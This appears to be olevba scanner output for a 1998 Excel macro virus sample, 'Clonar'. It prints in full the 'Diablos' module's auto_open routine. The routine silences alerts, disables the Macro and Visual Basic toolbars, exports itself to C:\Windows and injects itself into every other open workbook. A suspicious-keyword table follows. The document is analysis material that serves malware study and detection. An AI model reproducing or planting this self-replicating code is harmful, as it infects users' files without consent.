olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Diablos.bas 
in file: Virus.MSExcel.Clonar-c4c728070a6be42c6c37688177110f5198abd649 - OLE stream: '_VBA_PROJECT_CUR/VBA/Diablos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Diablos Macro
' Bios Virus Macro - (C) Copyright 1998 - Spalaci

Sub auto_open()
Attribute auto_open.VB_Description = "Macro grabada el 5/07/98 por Epson"
Attribute auto_open.VB_ProcData.VB_Invoke_Func = "D\n14"

' Disable Menssages
  Application.DisplayAlerts = False

' Disable Tools + Keys
  Set Bar1 = CommandBars("Macro")
  Bar1.Enabled = False
  Set Bar2 = CommandBars("Visual Basic")
  Bar2.Enabled = False
    
' Clonar Codigo Diablos
  ThisWorkbook.VBProject.VBComponents("Diablos").Export ("C:\Windows\Diablos.bas")
    
' Clean + Infeccion
  For Each I In Workbooks
      If I.Name <> ThisWorkbook.Name Then
         For Each J In I.VBProject.VBComponents
             If J.Name = "Diablos" Then
                I.VBProject.VBComponents.Remove I.VBProject.VBComponents("Diablos")
             End If
         Next J
         I.VBProject.VBComponents.Import ("C:\Windows\Diablos.bas")
      End If
  Next I

' Label
  If Day(Date) = 30 Then
     CommandBars.LargeButtons = True
  End If
  
' Enable Messages
  Application.DisplayAlerts = True
  
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

